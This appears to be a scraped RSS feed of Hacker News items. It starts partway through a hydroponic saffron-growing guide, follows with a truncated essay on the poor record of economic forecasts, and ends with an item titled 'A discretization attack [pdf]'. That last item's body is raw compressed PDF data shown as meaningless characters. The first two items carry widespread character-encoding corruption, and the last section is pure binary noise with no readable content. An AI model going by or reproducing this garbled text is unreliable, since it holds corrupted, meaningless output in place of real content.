<p>Another option is to keep several sets of corms and their daughter corms ready; while one set is in the dormant stage the others will be producing. Dormant Corms should be stored in a dry location and planted out at the appropriate time over the winter and will sprout again in the fall. After breaking the dormancy they do need to go through their vegetative stage to gain enough energy for the production of the following season√¢‚Ç¨‚Ñ¢s crop. Each healthy parent corm produces about five to ten daughter corms that can be used to give another crop in the following season.</p>
<h4><span id="Hydroponic_setup_and_nutrient_solution_for_saffron"><strong>Hydroponic setup and nutrient solution for saffron</strong></span>
</h4>
<p>For growing saffron in hydroponics system like NFT, DWC and pin trays are commonly used. Pin trays are principally temporary growing chambers where the plants√¢‚Ç¨‚Ñ¢ roots will be growing and the bulbs are anchored. These chambers provide support while the roots are developing. Loose growing media such as Perlite, vermiculite √¢‚Ç¨‚Äú <a data-ail="1844" target="_self" href="https://gardeningtips.in/hydroponics-perlite-growing-medium-advantages">perlite</a> blend, <a data-ail="1844" target="_self" href="https://gardeningtips.in/coconut-coir-benefits-for-gardening-making-uses">coco coir</a>. Oasis starter cubes are used for starting bulbs. The Media must be loose enough to allow bulb and root expansion but powerful enough to support the full-grown flowering plants.</p>
<p>Plants that grow with Bulbs or corms; grow best with lots of phosphorus and potassium for growth and flower production. Not too much nitrogen is required. Hydroponic nutrients are not strictly necessary for germination if you choose this way; the corms/seeds should be supplied with nutrients mixed at less than half strength with water.</p>


<p>You may also like<a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-broccoli-a-complete-guide"><strong><span> Growing Hydroponic Broccoli</span></strong></a>.</p>

<p>Some of the more adventurous growers like to dive into plant chemistry and formulate their own nutrient solutions, assuming you are prepared to deal with some plant losses while experimenting.</p>
<p>In the case of Saffron, the plant does not require much attention the only thing you are interested here is germination and flowering. Once the plant has flowered rest growth it is no longer of any use, the stigmas are harvested upon bloom. So the option is nutrient solution should be the one specially designed to promote flowering /blooms. √Ç&nbsp;So you can fetch bloom formulation from any store just make sure you do dilution as per the manufacturer√¢‚Ç¨‚Ñ¢s instructions. Nutrient values should be measured at regular intervals with pH and EC meters, nutrient attributes an EC of 1.4 and pH 5.5 encourage flowering.</p>
<h4><span id="The_temperature_requirement_for_growing_saffron_hydroponically"><strong>The temperature requirement for growing saffron hydroponically</strong></span>
</h4>
<p>One of the advantages of the indoor hydroponic technique is temperature can be manipulated by the grower. A range of 60 to 65 degree Fahrenheit in daytime range, with nigh-time temperature, should not be lower than 53 Fahrenheit is best for the flowering.</p>
<p>If it gets too warm the flower will experience flower drop and in too cold conditions plant will also get flower drop followed by dormancy. So indoor grow room, should be manipulated in such a way that it provides dry warmth of summer to induce growth, followed by damp and cooler conditions to induce flowering.</p>

<p>You should not miss <a data-mil="1844" href="https://gardeningtips.in/growing-bottle-gourd-hydroponically-lauki-from-seed"><strong><span>Growing Bottle Gourd Hydroponically</span></strong></a>.</p>
<h4><span id="The_light_requirement_for_saffron_growing_hydroponically"><strong>The light requirement for saffron growing hydroponically</strong></span>
</h4>
<p>Exposure of 14 to 16 hours of direct light per day is the optimal day length to induce flowering. Post-flowering the day length can be reduced to 12 √¢‚Ç¨‚Äú 14 hours a day. So make sure you install your hydroponic setup in the place where optimum light hours are met.</p>
<h4><span id="Flowering_and_harvesting_saffron_in_hydroponics"><strong>Flowering and harvesting saffron in hydroponics</strong></span>
</h4>
<p>The flowering of the corms will usually take place quite quickly after planting; within a few weeks, the first emerging flower buds can be seen. The flowers will completely open within three to five days and will be ready for harvest. As each flower blooms, it should be plucked or snipped from the plant and taken away for further processing.</p>
<p>Inside the flower there will be two or three thin dark red coloured thread like a stigma which are the economic part of the plant and forms the saffron spice when dried; there will also be three, shorter, wider, golden-colored anthers which usually bear pollen on their surface these are not element of the spice and should be discarded. The simplest way of removing the saffron stigmas from the center of the flower is to pull back and remove all the petals and then clip the red strands at the base. These will then require to be dried before storage.</p>
<figure id="attachment_1845" aria-describedby="caption-attachment-1845"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg" alt="Dry Saffron." width="800" height="535" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20535'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg"><figcaption id="caption-attachment-1845">Dry Saffron.</figcaption></figure><p>Saffron is very delicate and the strands should be placed carefully on white paper and allowed to air dry and fully desiccate. Any slight breeze can easily blow not only the strands but your efforts too. Being small and very light, the saffron dries within a week in most cases and can then be stored in airtight glass jars for better storage. A small pack of silicon desiccant can be used to make ensure that any additional moisture on the strands or air does not cause any storage problems. Inadequately dried saffron invites mold, fungi, so supplementary air-drying time is recommended if the humidity levels are high.</p>
<p>That√¢‚Ç¨‚Ñ¢s all folks about growing saffron hydroponically along with its cultivation practices without <a data-ail="1844" target="_self" href="https://gardeningtips.in/preparing-soil-for-vegetable-garden-a-full-guide">soil</a>.</p>
<p>You may also check the <a href="https://www.agrifarming.in/sweet-potato-cultivation-income-profit-project-report"><span><strong>Sweet Potato Cultivation Income, Profit, Project Report</strong></span></a>.</p>

<div>
<div data-currpage="1" id="epyt_gallery_76212"><iframe id="_ytid_61147" width="696" height="392" data-origwidth="696" data-origheight="392" src="https://www.youtube.com/embed/nqikG1ByIZQ?enablejsapi=1&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;modestbranding=0&amp;rel=0&amp;fs=0&amp;playsinline=0&amp;autohide=2&amp;theme=dark&amp;color=red&amp;controls=1&amp;" title="YouTube player" data-epytgalleryid="epyt_gallery_76212" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe><div><div><div tabindex="0" role="button" data-videoid="nqikG1ByIZQ"><div><div data-bg="https://i.ytimg.com/vi/nqikG1ByIZQ/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Terrace Gardening Guide</p></div><div tabindex="0" role="button" data-videoid="7rWkpXcrzrg"><div><div data-bg="https://i.ytimg.com/vi/7rWkpXcrzrg/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Mushrooms Indoors</p></div><div tabindex="0" role="button" data-videoid="aIs5My0dRGI"><div><div data-bg="https://i.ytimg.com/vi/aIs5My0dRGI/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>How To Make Compost</p></div><div tabindex="0" role="button" data-videoid="nL8pSWvQHHU"><div><div data-bg="https://i.ytimg.com/vi/nL8pSWvQHHU/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Coriander from Seed</p></div><div tabindex="0" role="button" data-videoid="v5JeoXtqk2s"><div><div data-bg="https://i.ytimg.com/vi/v5JeoXtqk2s/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Organic Farming Basics</p></div><div tabindex="0" role="button" data-videoid="jB6rx9N5L1E"><div><div data-bg="https://i.ytimg.com/vi/jB6rx9N5L1E/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Hydroponic Farming</p></div></div></div></div></div>

<!-- AI CONTENT END 1 -->
        </div></div>]]>
            </description>
            <link>https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521329</guid>
            <pubDate>Fri, 18 Sep 2020 20:06:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24521279">thread link</a>) | @anarbadalov
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You‚Äôll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte‚Äôs site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies‚Äô websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn‚Äôt stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you‚Äôll find forecasts stretching all the way to the year 2100. We‚Äôre still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let‚Äôs take a moment to look at the predictions of the past.&nbsp;Let‚Äôs see how our projections panned out.</p><h3>We can‚Äôt predict recessions</h3><p>The Economist‚Äôs ‚ÄúThe World in 2020‚Äù, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue‚Äôs predictions on 2020‚Äôs economic outlook:&nbsp;</p><blockquote><p>‚ÄúBanks, especially in Europe, will battle with negative interest rates. America will flirt with recession‚Äîbut don‚Äôt be surprised if disaster fails to strike, and markets revive.‚Äù</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn‚Äôt to know that we were on the precipice of a pandemic.&nbsp;So let‚Äôs review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;‚ÄúIn the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: ‚ÄúThe record of failure to predict recessions is virtually unblemished.‚Äù‚Äù</p></blockquote><p>It‚Äôs hard to overstate the severity of Loungani‚Äôs findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund‚Äôs predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden‚Äôs success rate of 0.85% is remarkably consistent with Longani‚Äôs.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>‚ÄúSince 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.‚Äù</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It‚Äôs clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn‚Äôt stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>‚ÄúEven with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (‚Ä¶) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.‚Äù</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn‚Äôt sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>‚Äú(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany‚Äôs economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.‚Äù</p></blockquote><p>But it isn‚Äôt just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you‚Äôd expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn‚Äôt stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>‚ÄúThe level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government‚Äôs budget.‚Äù</p></blockquote><p>With interest rates being so important to so many, it‚Äôs no surprise that an entire industry of professional predictors exists to monitor the rate‚Äôs past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions‚Äô lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That‚Äôs like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn‚Äôt a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>‚ÄúThe decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.‚Äù</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn‚Äôt stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>‚ÄúIn six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (‚Ä¶) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.‚Äù</p></blockquote><p>Gigerenzer‚Äôs own conclusion was even more clear:</p><blockquote><p>‚ÄúForecasts of dollar-to-euro exchange rates are worthless.‚Äù</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate ‚Ä¶</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521279</guid>
            <pubDate>Fri, 18 Sep 2020 20:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A discretization attack [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24520781">thread link</a>) | @Kubuxu
<br/>
September 18, 2020 | https://cr.yp.to/papers/categories-20200918.pdf | <a href="https://web.archive.org/web/*/https://cr.yp.to/papers/categories-20200918.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div √Æ≈ìj="">√Ñ√ªg√≥
‚Ä†√Ü~mL√∑}¬Ø√Æ¬Æ)√ß{MJ√Ö¬™√ö√©^‚Äú2√±c√©CQ¬Æ¬≤^¬•¬∫J≈í‚Äì√â21z√π√≠e*¬¥L√º√•&lt;¬´√íÀÜ √é√©√ö¬æ‚Äò√¨√≤ÔøΩqS`wÔøΩÀÜ√Ü¬¢E.≈ì√Ç≈æ=√¢$}√ù¬§Àúj¬¥wP¬®≈†3√±¬®$700D‚Äπ√¨)√ævA√¶√ù‚Äù∆íG
√à‚Ä¶q=z√≤w√èr√©≈í√™¬¨8¬±‚Äò‚Äì‚Äú
'L&gt;¬£F√ÅoQ&gt;‚Ç¨≈ΩZ&amp;N/&gt;M√ß≈æn0'Y≈†¬≤-*ÀÜ¬µ√Ö\&lt;¬ßXjr√¢5S√î√¶k‚Ä∞√Ç√¢[‚Ä∞√øÔøΩ
¬£N&amp;√â¬∂6√íJ√π‚ÄùE%P¬´√ñh‚Äπ√™√Ø-√∑''√∑√Æ√Ω√ñ≈æ}√±&lt;√ácH√Æ-‚Ä°¬´G¬®.¬π‚Äù√á√ùk_¬∑C√¨¬≤ ¬¥√•	,√üq√¨K¬Ω√∏-)‚Äò√ò√óR¬®√ÇK=ÔøΩAX&lt;
√ª√Åc√âi∆íÔøΩ?n≈†√óT√Øi√§mU√Å\p‚Äò√µB√¨√•6o(√¶b√ï{√Ä¬πÔøΩÔøΩ‚Ä†)O‚Ä¶#√Ñ¬™≈ì‚Äú@√ò√ë√ú√†√ÅZ√†.p√Ö¬∂¬≤√Üd√∑¬∑D\¬º‚Ä¶u√ëE5¬øK√í√µ4&amp;¬æ5
U√áCW‚Ä¶r√ã¬£‚Ä¢n:x√Æt4ddp‚Äû√ºkhÔøΩ,‚Ä†g√Æ-¬πF√∂¬§≈Ω‚Ä∞ÔøΩ√≥R9W%√π≈ì√¨fw√∂√â/‚Ä¢HI'√ê¬Ωmk4≈°ÀÜ¬∞‚ÄùÀÜ√Äi|l√ëMG¬∏√≤.9√∞ÔøΩ‚Ä†8¬∏√à√±B√ÑC8√•q&lt;√ã√™√Ñ¬£ÔøΩe√ê5-3`g1¬ßWR&nbsp;¬≥Àú¬®(H fO‚Äö,‚Äô√ª¬æ≈ío.‚Äô√≤cp≈Ω√°q^√à¬®&lt;ÀÜ)√ç¬ª√à$√ë*√Ö‚Ä¶k#`XCX(‚Äû¬¶\l{√Ω√£‚Äú F√ü9	
?√´√ùTD¬∑√Æ(¬Æ*√àM\≈†‚Ä¢¬™¬πT Q2@√∏dO√±'RE‚Äòj
√úr‚Ä∞ÀÜ(v√π¬∑&amp;$‚Äûp√ß'¬Æ√º≈∏7E√Ü¬¨‚Ä∞√∂¬§ÔøΩ¬•~‚Ä°¬°≈°#8Y*4√ø¬≤√∞√ç√∞'2&gt;‚Ä¶
!√ô√´√í‚Äò(WX‚Ä∫√°∆í¬¥√ΩI√í¬§√ã_PÔøΩk
Àú√æ‚Äò¬≠N?:¬ø.¬´:‚Ä¢0√ì¬∏√É√¥5V/¬£√Æ√´^√π¬ø√§≈æL√É
endstream
endobj
49 0 obj
&lt;&lt;
/Length 2629      
/Filter /FlateDecode
&gt;&gt;
stream
x√ö¬µ√ô‚Äô√õ¬∏√±√ù_1‚Ä¢‚ÄîPU#≈°√∑√°‚Äî¬≠√Ñkg7¬©rycm^√¢&lt;`HHbL‚Ä∞Zg√º√µ√©&lt;4≈ìq√¨$5U√ÉFh4}+√¥¬£‚Ä∫√æB√πV¬ß√Å√ç‚Ç¨?¬Ω√∏√£√Æ√Ö√ã¬∑qpS√∏e‚Äì%7¬ª√ΩMT√¶√ß7Y≈ì√ªY^√û√¨√™‚Ä∫¬ø{√òl√£$√∂√™√ÜT¬Ω¬∂√ç‚ÄîM√®)√õtgF+kU¬µ‚Ä∞J√Ø≈í√É&lt;√∂√¢√ç?v√èx√π¬∂¬∏)ÔøΩf‚Äù!√Ωm~√Ñ¬§~D|√ÄO√ù&amp;*¬º√è‚Ä∫(√∑√¥=‚Äö¬∫¬øbi√™√ô¬£√Æ5‚Äö‚Ñ¢Ww‚Ä∫-N≈æ;√ãK√î√•√Ç¬™√ß√õ√±√Ñ¬£y√©√µ}√ì
‚Ä†¬ß√ö√Ü√™^√ô√Å√ëf
]s√Ü√Éms&gt;√∞¬≤n¬∞B√≤¬®Fn¬Ø√±‚Ä†p¬ªm√∫e≈°√±%.=3Xi∆í¬ß‚Äù¬•√ó√≠√±Àú√Æ¬¥√ô‚Ä†p√à¬≠g√¢0[√µ√õ‚Ñ¢c√µI6T√™√å√Ä√Ñ:l√ß `D√ñx√∏√ã¬∑I6kg~√è0+√∫^¬°$,¬ºf√è_ÔøΩ#'√ù7‚Äì√ÅN√¶√¥&amp;√Ü¬™#]j√´H√±√ùR&amp;8√ß√•PxGE¬¢√åÔøΩ√ï4dx&amp;NU8√®√∫~≈ì¬®l√ª√Ä‚Äπ‚Ä¢1 B√ä5√¶√ä√¶‚Ä∞≈∏F‚Ä¶¬ª‚Ä¶√è‚Ä¶Y√¨y¬∏d√®√ós¬≠{c√ï¬πfy‚Äöt√®≈†q4√ä¬´ ‚Ä¶‚ÄûÔøΩ&lt;¬Æ1√ç]√üÔøΩ√ÅQ-Àú√´√µoC√ì;¬º¬±C√Ω dG6√áW¬º√Ä√≥√ê{√¶+√¥‚Äú4_¬≤5√ó√ç#√µv√á√©&amp;&nbsp;d
9√Øy¬º‚Äî¬µ∆í¬°‚Äúa-‚Ä∫T
u¬°√£@ep{8N√çOp√õ&gt;7&nbsp;‚Ä¢D‚Äô‚Ñ¢√î¬æk[6*¬æ&nbsp;HF≈∏A√Ø√õ‚Ä¶√∫
√´√¶¬®√Ñ≈Ω^]√ôoÀú√å√û(√≥√ã&lt;ÔøΩÔøΩ‚Ç¨‚Ä∞D√±?a√æ≈í√â#¬ª7√ù¬±√ê#√¥¬∏√ü&nbsp;√∑lÔøΩÀÜXjb√†√ñ√ÆU+¬´√ê√å√±;√ö
m%¬©√©√ö√ß√°√´√Æl≈°≈°¬ºI‚Äù$≈æ√∂√æ¬≠√¨&gt;√™5)¬¥&nbsp;<m¬•¬∑w√ä‚Ç¨¬°ÔøΩ?@d√Ñ√ª¬ª0√¥√åpwj@‚Ñ¢‚Ç¨4 √ü¬æ√é¬≤'√¢¬•√§ÔøΩp="ÔøΩ√Ø~√æ¬∞√£¬©√∑¬∫ÔøΩ√ù√æ2(√∂:√ÉiÔøΩ¬°√ó$‚ÄπC¬Ø.G\‚Ä¶v√á√û√î|√ï√ó√ç√ßÀÜ√πU\√î?ue√≥1H<√≤√Ω/¬Ø" √Ω√ßv√ã√Ø¬¥8√º[^√∂="" √õ(be√ãq¬∏√†√û√É0f√±√á√®8¬¶k√†ÔøΩ√ú¬Æw¬Ω:i‚Äπ√ñ√Ç¬´¬¨y√Ö¬†<#‚Äö$√≥m√Ñ∆í¬ø<√ú9[‚Äò√§√¢|v¬°√≥√ã$sw‚Ñ¢ow¬∫o√É√®¬±ÔøΩjr?ÀÜ√ák√É+¬¨ÔøΩ≈†‚Ç¨t.h√•y√±¬≠√§‚Ä∫i‚Ä¶a‚Äù¬¨√ãg√Ü@<iz≈∏ÔøΩm¬´%‚Ä¶∆íw¬ª¬ø¬¢,~‚Äî%~‚Äòg√ü&¬Æ√ÄÔøΩÔøΩ‚Äô√£√é¬∂≈Ωi‚Äò√•c√¶√≤√úÔøΩ√ã√®+7≈†a¬πb1√ã√≥√ø‚Äöbqe1="" √ä¬¨ÀÜ√Ç√Ø¬£¬¶√πe\.#?q√ÆÔøΩ√â∆í¬≤i√Æ¬ß√ì#?o‚Äöy√Æ'e√æ√Ω6(√û5√â¬ØÔøΩ√àat√º1√ç≈°‚Äπ!¬∞}s¬Ωb¬¥3&√Äw√çx√Ω="" ;√≠√∞yjf√ù017mÀú√ìd√º¬æ≈í√¶‚Äû√•√∏‚Äû√é]√∫)≈†ÔøΩ√∞√ï="" √öay√≤¬æ‚Ç¨"‚Äô0√ªq="" wgÔøΩn√üicl¬≥-¬´√ø¬´‚Äî√õ¬π¬§!b¬¶√Å‚Äì="" u≈íq√º1¬∫0√âw="" k(√Ωc¬°∆í√õ_1^dÔøΩ‚Ä∫^w¬Ω√û~√∏√õ√ªm‚Äòx="">¬£&amp;‚Ñ¢√£h&amp;s&gt;√Ñ2
